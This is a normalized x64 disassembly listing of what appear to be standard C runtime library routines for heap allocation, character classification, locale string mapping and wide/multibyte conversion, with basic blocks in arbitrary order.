xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_1800109d0
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_180011420
int3
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ rw-data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_180016624
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
call DecodePointer
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x38 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x70 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
sub edx 0x6
je r-xdata
call EncodePointer
mov [ r12 ] rax
mov ecx [ rw-data ]
mov edx ecx
mov [ rsp + 0x30 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x38 ]
mov r14d [ rsp + 0x70 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
cmp edx 0x1
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_180016524
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x30 ] edx
mov ecx [ rw-data ]
jmp r-xdata
call sub_180010834
mov [ rax ] 0x16
and [ rsp + 0x20 ] rsi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ rw-data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
xor eax eax
mov [ rsi + 0xb0 ] r14d
cmp ebx 0x4
jne r-xdata
sub_180019a40
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
mov rbp [ rsp + 0x120 ]
mov r15d r9d
mov r14d r8d
mov r13 rcx
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
xor esi esi
lea r9 [ rsp + 0x30 ]
mov r8d r15d
and [ rsp + 0x28 ] esi
mov edx r14d
lea rdi [ rsp + 0x30 ]
mov [ rsp + 0x20 ] 0x80
call sub_18001c8e8
mov r12d eax
test eax eax
jne r-xdata
or eax 0xffffffff
and [ rsp + 0x28 ] edx
lea rdi [ rw-data ]
mov r8d r15d
mov edx r14d
mov r9 rdi
mov [ rsp + 0x20 ] 0x4
call sub_18001c6b0
test eax eax
je r-xdata
movsxd r13 r12d
mov edx 0x1
mov rcx r13
call sub_180011510
mov rcx rax
mov [ rbp ] rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ rbp ] 0x0
lea eax [ r12 - 0x1 ]
mov r8 rdi
mov rdx r13
movsxd r9 eax
call sub_180016788
test eax eax
je r-xdata
test esi esi
je r-xdata
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] esi
xor r9d r9d
mov r8d r15d
mov edx r14d
mov rcx r13
call sub_18001c8e8
movsxd r12 eax
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov cl [ rbp ]
add rdi 0x2
mov al cl
shl al 0x2
add cl al
lea rax [ rw-data ]
add cl cl
add cl sil
sub cl 0x30
cmp rdi rax
mov [ rbp ] cl
jl r-xdata
test esi esi
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
mov rcx rdi
call sub_18000e06c
mov esi 0x1
mov rcx r12
mov rdx rsi
call sub_180011510
mov rdi rax
test rax rax
je r-xdata
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_180017570
add rsp 0xc0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx esi [ rdi ]
mov ecx esi
call sub_18001a9f0
test eax eax
je r-xdata
jmp r-xdata
mov rcx rdi
call sub_18000e06c
and [ rsp + 0x28 ] 0x0
mov r9 rax
mov r8d r15d
mov edx r14d
mov rcx r13
mov [ rsp + 0x20 ] r12d
call sub_18001c8e8
mov r12d eax
test eax eax
je r-xdata
sub_180019c4c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0xc
call sub_180010764
test rbx rbx
je r-xdata
mov rcx rdi
call sub_1800134e0
test eax eax
jne r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_180019cfc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_18000e0ac
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_18000e06c
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_1800134e0
call sub_180010834
mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_180010834
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800107ec
mov [ rbx ] eax
mov rcx rbx
call sub_1800134e0
test eax eax
je r-xdata
call sub_180010834
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800107ec
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_180019dd0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor edi edi
mov rbx rdx
mov rsi rcx
test rdx rdx
je r-xdata
imul rbx r8
test rcx rcx
je r-xdata
xor edx edx
lea rax [ rdi - 0x20 ]
div rbx
cmp rax r8
jae r-xdata
mov rdx rbx
mov rcx rsi
call sub_180019cfc
mov rsi rax
test rax rax
je r-xdata
call sub_180014a18
mov rdi rax
call sub_180010834
and [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0xc
call sub_180010764
xor eax eax
jmp r-xdata
mov rax rsi
cmp rdi rbx
jae r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub rbx rdi
lea rcx [ rdi + rax ]
xor edx edx
mov r8 rbx
call sub_180016870
sub_180019e6c
mov edx 0x30
cmp cx dx
jb r-xdata
or eax 0xffffffff
retn
cmp cx 0x3a
jae r-xdata
mov edx 0xff10
cmp cx dx
jae r-xdata
movzx eax cx
sub eax edx
retn
mov eax 0xff1a
mov edx 0x660
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x6f0
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x966
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0xc66
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0xe50
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x46 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x1040
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x17e0
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x26 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
jmp r-xdata
cmp cx ax
jb r-xdata
sub_18001a004
mov [ rsp + 0x8 ] cx
push rbx
sub rsp 0x60
mov eax 0xffff
movzx ebx dx
cmp cx ax
jne r-xdata
mov eax 0x100
cmp cx ax
jae r-xdata
xor ecx ecx
mov ax cx
jmp r-xdata
lea rcx [ rsp + 0x40 ]
mov rdx r8
call sub_18000d428
mov r11 [ rsp + 0x40 ]
mov edx 0x1
mov eax [ r11 + 0x14 ]
lea r8 [ rsp + 0x70 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] eax
mov eax [ r11 + 0x4 ]
mov r9d edx
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x78 ]
mov [ rsp + 0x20 ] rax
call sub_18001c95c
xor ecx ecx
cmp eax ecx
jne r-xdata
mov rax [ rw-data ]
movzx ecx cx
mov ax [ rax + rcx * 2 ]
and ax bx
jmp r-xdata
movzx eax ax
movzx ecx bx
and eax ecx
add rsp 0x60
pop rbx
retn
mov ax [ rsp + 0x78 ]
mov eax ecx
mov [ rsp + 0x78 ] cx
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
mov ax [ rsp + 0x78 ]
cmp [ rsp + 0x58 ] cl
je r-xdata
sub_18001a0c0
mov [ rsp + 0x8 ] cx
push rbx
sub rsp 0x40
mov eax 0xffff
movzx ebx dx
cmp cx ax
jne r-xdata
mov eax 0x100
cmp cx ax
jae r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov rax [ rw-data ]
movzx ecx cx
movzx eax [ rax + rcx * 2 ]
movzx ecx bx
and eax ecx
jmp r-xdata
add rsp 0x40
pop rbx
retn
xor r8d r8d
movzx edx bx
call sub_18001a004
mov eax [ rw-data ]
mov edx 0x1
lea r8 [ rsp + 0x50 ]
mov [ rsp + 0x30 ] eax
mov eax [ rw-data ]
lea rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x60 ]
mov r9d edx
mov [ rsp + 0x20 ] rax
call sub_18001c95c
movzx ecx [ rsp + 0x50 ]
sub_18001a150
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x60
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x50 ] rbx
mov [ rbp + 0x58 ] rsi
mov [ rbp + 0x60 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x18 ] rax
mov r10d [ rw-data ]
mov esi 0x2
xor edi edi
mov r11 r9
mov [ rbp + 0x10 ] r9
mov [ rbp ] r8d
mov r14d edx
mov [ rbp + 0x8 ] edx
mov rbx rcx
lea r13d [ rsi - 0x1 ]
cmp r10d edi
jne r-xdata
mov r9d [ rbp + 0x70 ]
cmp r9d edi
jle r-xdata
lea r8 [ r--data ]
mov r9d r13d
mov edx 0x100
xor ecx ecx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call [ LCMapStringW@IAT ]
cmp eax edi
je r-xdata
cmp r10d esi
je r-xdata
mov ecx r9d
mov rax r11
call [ GetLastError@IAT ]
mov r10d [ rw-data ]
cmp eax 0x78
cmove r10d esi
mov [ rw-data ] r10d
mov r10d r13d
mov [ rw-data ] r13d
jmp r-xdata
mov rsi rdi
mov r12 rdi
cmp r14d edi
jne r-xdata
cmp r10d edi
je r-xdata
mov eax r9d
sub eax ecx
sub eax r13d
cmp eax r9d
jge r-xdata
add rax r13
cmp ecx edi
jne r-xdata
mov r11 [ rbp + 0x10 ]
mov edi [ rbp + 0x88 ]
test edi edi
jne r-xdata
mov rax [ rbx ]
mov r14d [ rax + 0x14 ]
mov [ rbp + 0x8 ] r14d
cmp r10d r13d
jne r-xdata
mov r9d eax
mov [ rbp + 0x70 ] eax
lea r9d [ rax + 0x1 ]
mov [ rbp + 0x70 ] r9d
jmp r-xdata
sub ecx r13d
cmp [ rax ] dil
je r-xdata
or ecx 0xffffffff
mov ecx r14d
call sub_18001bb7c
mov r13d eax
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx ]
mov edi [ rax + 0x4 ]
xor eax eax
jmp r-xdata
mov r12d [ rbp + 0x88 ]
mov esi edi
cmp r12d edi
jne r-xdata
mov r15 [ rbp + 0x78 ]
mov r8 [ rbp + 0x10 ]
cmp eax edi
je r-xdata
mov rcx [ rbp + 0x18 ]
xor rcx rbp
call sub_180017570
mov rbx [ rbp + 0x50 ]
mov rsi [ rbp + 0x58 ]
mov rdi [ rbp + 0x60 ]
lea rsp [ rbp + 0x20 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
neg [ rbp + 0x90 ]
mov r8 r11
mov ecx r12d
sbb edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
and edx 0x8
add edx r13d
call [ MultiByteToWideChar@IAT ]
movsxd r15 eax
cmp r15d edi
je r-xdata
mov rax [ rbx ]
mov r12d [ rax + 0x4 ]
mov eax [ rbp + 0x80 ]
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov [ rsp + 0x28 ] eax
mov ecx r14d
mov [ rsp + 0x20 ] r15
call [ LCMapStringA@IAT ]
mov edi eax
xor ebx ebx
lea r9 [ rbp + 0x70 ]
mov edx eax
mov ecx edi
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call sub_18001bbd0
mov rsi rax
cmp rax rbx
je r-xdata
mov rbx 0xffffffffffffff0
mov r14d 0xdddd
mov r13d 0x400
jle r-xdata
cmp r12 rbx
je r-xdata
mov rcx rsi
call sub_18000e06c
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov r8 rax
mov ecx r14d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ LCMapStringA@IAT ]
movsxd r9 eax
mov [ rbp + 0x4 ] r9d
cmp r9d ebx
jne r-xdata
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r15
cmp rax 0x2
jb r-xdata
mov eax edi
cmp r15 r12
je r-xdata
cmp r9d ebx
mov r14d 0xdddd
jle r-xdata
mov edi ebx
jmp r-xdata
mov r9d [ rbp + 0x70 ]
mov r8 [ rbp + 0x10 ]
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
lea rcx [ r15 + r15 + 0x10 ]
cmp rcx r13
ja r-xdata
mov rcx r12
call sub_18000e06c
test rbx rbx
jne r-xdata
mov rcx r9
cmp r9 0xffffffffffffffe0
ja r-xdata
cmp rsi rbx
je r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] r14d
jne r-xdata
mov edx [ rbp ]
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
mov ecx [ rbp + 0x8 ]
mov r9d r15d
mov r8 rdi
call [ LCMapStringW@IAT ]
xor r8d r8d
movsxd rsi eax
cmp esi r8d
je r-xdata
call sub_18000e0ac
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
movsxd r8 r9d
xor edx edx
mov rcx rbx
call sub_180016870
mov r11d [ rbp + 0x4 ]
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov ecx [ rbp + 0x8 ]
mov [ rsp + 0x28 ] r11d
mov r8 rsi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringA@IAT ]
mov [ rbp + 0x4 ] eax
test eax eax
jne r-xdata
xor ebx ebx
jmp r-xdata
add rcx 0x10
cmp rcx 0x400
ja r-xdata
mov eax esi
jmp r-xdata
call sub_18000e06c
mov r10d [ rbp ]
bt r10d 0xa
jae r-xdata
mov [ rax ] r14d
and rax 0xfffffffffffffff0
call sub_1800232c0
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax rbx
mov eax [ rbp + 0x80 ]
lea r9 [ rbp + 0x4 ]
mov r8 rbx
mov [ rsp + 0x28 ] eax
mov edx edi
mov ecx r13d
mov [ rsp + 0x20 ] r15
call sub_18001bbd0
mov edi [ rbp + 0x4 ]
mov r12 rax
xor eax eax
cmp r12 rax
cmove edi eax
xor edi edi
jmp r-xdata
call sub_18000e0ac
mov rbx rax
test rax rax
je r-xdata
lea rbx [ rcx + 0xf ]
cmp rbx rcx
ja r-xdata
cmp esi r8d
jle r-xdata
mov eax [ rbp + 0x80 ]
cmp eax r8d
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
call sub_18000e06c
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] r14d
jne r-xdata
mov r9d [ rbp + 0x4 ]
mov [ rax ] r14d
and rbx 0xfffffffffffffff0
mov rax rbx
call sub_1800232c0
sub rsp rbx
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rbx 0xffffffffffffff0
mov rbx r8
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi eax
jg r-xdata
add rdi 0x10
mov [ rbx ] 0xcccc
jmp r-xdata
mov ecx [ rbp + 0x8 ]
mov r9d r15d
mov r8 rdi
mov edx r10d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r13
ja r-xdata
mov ecx [ rbp + 0x8 ]
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov r9d r15d
mov r8 rdi
mov edx r10d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
add rbx 0x10
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] r14d
jne r-xdata
mov eax [ rbp + 0x80 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
cmp eax ecx
jne r-xdata
call sub_18000e0ac
xor r8d r8d
mov rbx rax
cmp rax r8
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_18000e06c
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
mov r10d [ rbp ]
jmp r-xdata
mov [ rax ] r14d
and rax 0xfffffffffffffff0
call sub_1800232c0
sub rsp rax
lea rbx [ rsp + 0x40 ]
cmp rbx r8
je r-xdata
mov rax rbx
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp rbx r8
je r-xdata
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
sub_18001a690
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_18000d428
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_18001a150
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001a728
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x50
mov esi edx
mov rdx rcx
lea rcx [ rax - 0x28 ]
mov rbx r9
mov edi r8d
call sub_18000d428
mov r9d [ rsp + 0x80 ]
xor ebp ebp
cmp r9d ebp
jle r-xdata
mov eax [ rsp + 0x90 ]
mov r8 rbx
mov edx edi
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x88 ]
mov ecx esi
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
cmp [ rsp + 0x48 ] bpl
je r-xdata
mov eax r9d
mov rcx rbx
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub r9d eax
dec r9d
add rcx 0x2
cmp eax ebp
jne r-xdata
dec eax
cmp [ rcx ] bp
je r-xdata
or eax 0xffffffff
sub_18001a7cc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9w
push rbp
push rsi
push rdi
sub rsp 0x60
xor ebp ebp
mov rdi r8
mov rsi rdx
mov rbx rcx
cmp rdx rbp
jne r-xdata
cmp rcx rbp
je r-xdata
cmp r8 rbp
jbe r-xdata
cmp r8 0x7fffffff
jbe r-xdata
or [ rcx ] 0xffffffff
cmp rcx rbp
je r-xdata
mov rdx [ rsp + 0xa0 ]
lea rcx [ rsp + 0x40 ]
call sub_18000d428
mov r11 [ rsp + 0x40 ]
cmp [ r11 + 0x14 ] ebp
jne r-xdata
call sub_180010834
mov ebx 0x16
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] rbp
call sub_180010764
xor eax eax
jmp r-xdata
mov [ rcx ] ebp
lea rax [ rsp + 0x88 ]
mov [ rsp + 0x88 ] ebp
mov ecx [ r11 + 0x4 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rbp
lea r8 [ rsp + 0x98 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
cmp eax ebp
je r-xdata
movzx eax [ rsp + 0x98 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rsp + 0x88 ] ebp
jne r-xdata
cmp rsi rbp
je r-xdata
cmp rsi rbp
je r-xdata
call sub_180010834
mov [ rax ] 0x2a
call sub_180010834
mov eax [ rax ]
cmp [ rsp + 0x58 ] bpl
je r-xdata
cmp rsi rbp
je r-xdata
cmp rbx rbp
je r-xdata
cmp rbx rbp
je r-xdata
cmp rdi rbp
ja r-xdata
cmp rdi rbp
jbe r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_180010834
mov ebx 0x22
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] rbp
call sub_180010764
cmp [ rsp + 0x58 ] bpl
je r-xdata
cmp rdi rbp
jbe r-xdata
cmp [ rsp + 0x58 ] bpl
je r-xdata
mov [ rbx ] eax
jmp r-xdata
mov [ rbx ] 0x1
mov [ rsi ] al
call sub_180010834
mov ebx 0x22
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] rbp
call sub_180010764
cmp [ rsp + 0x58 ] bpl
je r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_180016870
mov eax ebx
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_180016870
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_18001a9f0
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18000d428
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x4
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x4
lea r8 [ rsp + 0x20 ]
mov edx 0x4
mov ecx ebx
call sub_18001cc74
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_18001aa70
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18000d428
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x80
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x80
lea r8 [ rsp + 0x20 ]
mov edx 0x80
mov ecx ebx
call sub_18001cc74
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_18001aaf4
mov [ rsp + 0x18 ] rbx
push rsi
push rdi
push r12
sub rsp 0x20
test [ rcx + 0x18 ] 0x40
mov rdi rcx
lea r12 [ rw-data ]
lea rsi [ rw-data ]
jne r-xdata
test [ rdi + 0x18 ] 0x40
jne r-xdata
call sub_18001923c
cmp eax 0xffffffff
je r-xdata
add [ rdi + 0x8 ] 0xfffffffe
js r-xdata
mov rcx rdi
call sub_18001923c
cmp eax 0xffffffff
je r-xdata
mov r11 rsi
mov rcx rdi
call sub_18001923c
cmp eax 0xfffffffe
je r-xdata
mov rcx rdi
call sub_18001cd80
mov rcx [ rdi ]
movzx eax [ rcx ]
add rcx 0x2
mov [ rdi ] rcx
jmp r-xdata
test [ rsi + 0x8 ] 0x80
je r-xdata
mov rcx rdi
call sub_18001923c
cmp eax 0xfffffffe
je r-xdata
add [ rdi + 0x8 ] 0xffffffff
js r-xdata
mov rcx rdi
call sub_18001923c
